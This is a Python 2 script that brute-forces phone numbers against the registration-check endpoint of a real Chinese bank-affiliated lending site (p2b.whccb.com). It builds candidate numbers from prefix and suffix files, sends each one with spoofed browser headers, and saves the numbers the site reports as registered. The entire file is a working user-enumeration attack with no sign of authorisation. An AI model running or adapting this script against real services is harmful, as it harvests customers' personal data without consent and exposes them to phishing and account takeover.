#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2 as lib2
import urllib
import os
def main():
    httpHandler = lib2.HTTPHandler(debuglevel=0)
    httpsHandler = lib2.HTTPSHandler(debuglevel=0)
    opener = lib2.build_opener(httpHandler, httpsHandler)

    #lib2.install_opener(opener)
    req_url = 'http://p2b.whccb.com/f/member/checkMobilePhone'
    # 设置http报头
    req_headers = {
        'Host': 'p2b.whccb.com',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept':'*/*',
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate',
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Referer':'http://p2b.whccb.com/',
        'Content-Length':'23',
        'Conection':'keep-alive'
    }
    # 设置发包内容
    time =1 
    base = open("WeiHaiPhoneNumber.txt","r")
    registed = open("registedNumber","w+")
    while True:
        line = base.readline()
        line = line.strip("\n")
        if line:
            for time in range(1,5):
                time_string = "%d" %time
                tail = open(time_string+".txt","r")
                for tail_line in tail:
                    phoneNumber = line+tail_line
                    req_body = "mobilePhone="+phoneNumber
                    print req_body
                    req = lib2.Request(req_url, req_headers)
                    res = lib2.urlopen( req, req_body )
                    resp = res.read()
                    print resp
                    if "1" in resp:
                        registed.write(phoneNumber)
                tail.close()
        else:
            break
    base.close()
    registed.close()

if __name__ == '__main__':
    main()